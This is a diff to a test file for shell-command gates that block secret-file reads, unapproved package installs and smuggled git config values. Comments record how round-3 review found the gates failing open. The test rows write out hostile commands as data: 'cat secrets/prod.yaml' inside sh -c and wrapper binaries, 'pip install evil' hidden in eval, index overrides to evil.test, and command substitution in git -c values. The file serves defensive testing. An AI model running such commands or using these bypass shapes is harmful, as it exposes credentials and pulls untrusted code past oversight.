@@ -247,7 +247,21 @@ for cmd, want in (
          "allow"),
         # A multi-line UNQUOTED secret read must still block - the fix
         # carries quote state, it does not stop scanning after line one.
-        ("cd /app\ncat secrets/prod.yaml", "deny")):
+        ("cd /app\ncat secrets/prod.yaml", "deny"),
+        # [round-3 lens A, A2] The invoker re-tokenization used `read -ra`,
+        # which is LINE-oriented, so a MULTI-LINE invoker argument was
+        # truncated at the first newline and the path after it was never a
+        # candidate. This is the intersection of the two features round 2
+        # shipped together, and the corpus had no row combining them.
+        ("sh -c 'echo a\ncat secrets/prod.yaml'", "deny"),
+        ("bash -c \"echo a\ncat .env\"", "deny"),
+        # [round-3 lens A, A7] Wrapper binaries that do not change WHICH
+        # program runs. `timeout 5 sh -c` was allowed while `nohup sh -c`
+        # denied - an asymmetry with no defensible reason.
+        ("timeout 5 sh -c 'cat secrets/prod.yaml'", "deny"),
+        ("setsid sh -c 'cat secrets/prod.yaml'", "deny"),
+        ("flock /tmp/l sh -c 'cat secrets/prod.yaml'", "deny"),
+        ("nice sh -c 'cat .env'", "deny")):
     differential("secrets-gate", bash(cmd), want, repr(cmd))
 
 print("\n== secrets-gate: file surfaces ==")
@@ -315,6 +329,39 @@ for cmd, want in (
         # unquoted spelling on the next row still blocks.
         ('git commit -m "fix; npm install evil"', "allow"),
         ('git commit -m "fix" ; npm install evil', "deny"),
+        # [round-3 lens A/B, A1] ...but a shell INVOKER's quoted argument
+        # really is a command line, and it runs. The J-7 retirement's
+        # rationale ("hiding an install inside quotes does not run it") is
+        # true for prose and false here, and this was a fail-open the
+        # retirement introduced. Both substrates allowed it, so the
+        # differential could not see it - only a parent-vs-head diff could.
+        ("sh -c 'true; pip install evil'", "deny"),
+        ('bash -c "cd /x && npm install evil"', "deny"),
+        ("eval 'echo hi; pip install evil'", "deny"),
+        # [round-3 lens A/C, A3] Index overrides, every spelling. The name
+        # list caught `--index-url URL` and missed `--index-url=URL` and
+        # `-f URL`; the rule is now the VALUE carrying a scheme, which
+        # needs no list and cannot be bypassed by an unlisted flag.
+        ("pip install --index-url=https://evil.test/simple requests", "deny"),
+        ("pip install -f https://evil.test/wheels requests", "deny"),
+        ("npm install --registry=https://evil.test flask", "deny"),
+        ("cargo add --git=https://evil.test/repo", "deny"),
+        # [round-3 lens A/C, A4] ...but a bare integer after an unambiguous
+        # LONG flag is that flag's value, not a package. These were refused
+        # with "not in deps.md approved list: 60", telling the operator to
+        # add the integer 60 to their dependency policy.
+        ("pip install --timeout 60 requests", "allow"),
+        ("pip install --retries 5 requests", "allow"),
+        ("pip install --python-version 3 requests", "allow"),
+        # The short-flag half must still deny: 0, 1 and 2 are real npm
+        # packages and `-f` is npm's --force, which takes no value.
+        ("npm install -f 0", "deny"),
+        ("npm install -p 1", "deny"),
+        # [round-3 lens A, A5] A quoted value containing whitespace no
+        # longer ends the option run early, and quotes no longer hide the
+        # tool name from the matcher.
+        ('X="p q" pip install evil', "deny"),
+        ('"pip" install evil', "deny"),
         # F9: the flag's value is not a package name...
         ("pip install --no-binary :all: requests", "allow"),
         ("pip install --python-version 3.11 requests", "allow"),
@@ -579,16 +626,16 @@ def ledger(gate, payload, now, should, owner, label):
           f"behaviour moved without the row being updated")
 
 
-# The ledger is EMPTY. Every row it held (F-381, F-435, F-788, F-870,
-# F-891, F-947, F-1313, F-1357, F-1393) is fixed, and each one's shapes were
-# promoted into the live corpus above as positive assertions rather than
-# deleted - so the fixes are pinned in both directions and the ledger did
-# not become the place they went to be forgotten.
+# [round-3 lenses A/C] The ledger was INERT when this batch shipped it:
+# every row had been fixed, `ledger()` had zero call sites, LEDGER_OPEN was
+# structurally 0, and the count-pin compared 0 to 0. Deleting the entire
+# mechanism left the suite green. A device whose whole premise is "a test
+# that cannot fail is worthless" was shipped in a state where it could not
+# fail, and the commit that did it described the ledger as a standing guard.
 #
-# It stays here, with the count pinned at zero, because it is the mechanism
-# and not the contents that matters: the next review that finds an open
-# defect adds a row instead of leaving the suite green over it, and a row
-# added without updating the count fails immediately.
+# It is armed again below with the defects round 3 found and did NOT fix.
+# A row here is a promise that someone looked, not a promise that it is
+# harmless.
 
 stage_only(["src/unreferenced.py"])
 differential("spec-gate-commit", bash("git commit -m x"), "deny",
@@ -610,7 +657,11 @@ for _c in (
         'git -c user.email="$(id -un)@h.com" commit -m x',
         'git -c user.name="$(whoami)" -c user.email=a@b commit -m x',
         "git -c core.pager='less -R|cat' commit -m x",
-        "git -c http.proxy='http://a;b' commit -m x"):
+        "git -c http.proxy='http://a;b' commit -m x",
+        # [round-3 lens A, A5] A NEWLINE inside the quoted value. F-435
+        # fixed the `;` half of this property and left this half open,
+        # because the segment break was itself spelled with a newline.
+        'git -c a.b="p\nq" commit -m x'):
     differential("spec-gate-commit", bash(_c), "deny", repr(_c))
 
 # The quote-awareness that fixes F-435 must not become a way to HIDE a
@@ -624,8 +675,19 @@ for _c, _want in (('echo "git commit"', "allow"),
 # The count is pinned so a row cannot be DELETED to silence it. Deleting a
 # row without fixing the defect trips this; fixing a defect trips the row
 # itself first ("delete this row"), then this. Both steps are deliberate.
-check(f"known-defect ledger holds exactly 0 open rows (got {LEDGER_OPEN})",
-      LEDGER_OPEN == 0,
+# -- round-3 lens A, A10: an unbalanced quote in front of a deliberately
+# -- EXEMPTED dotenv template. The shell allows (its scanner takes the rest
+# -- of the line as the run and the basename exemption applies); the SDK's
+# -- shlex fallback emits a quote-stripped variant that misses the exact
+# -- basename test and denies. Pre-existing at every commit in this chain,
+# -- in the false-positive direction, and the round-2 unbalanced-quote rows
+# -- covered only shapes that SHOULD deny.
+ledger("secrets-gate", bash("cat '.env.example"), ("allow", "deny"),
+       ("allow", "allow"), "A10 unbalanced quote vs dotenv exemption",
+       "cat '.env.example")
+
+check(f"known-defect ledger holds exactly 1 open row (got {LEDGER_OPEN})",
+      LEDGER_OPEN == 1,
       "a row was added or removed without updating this count")
 
 # --------------------------------------------------------------------------- #
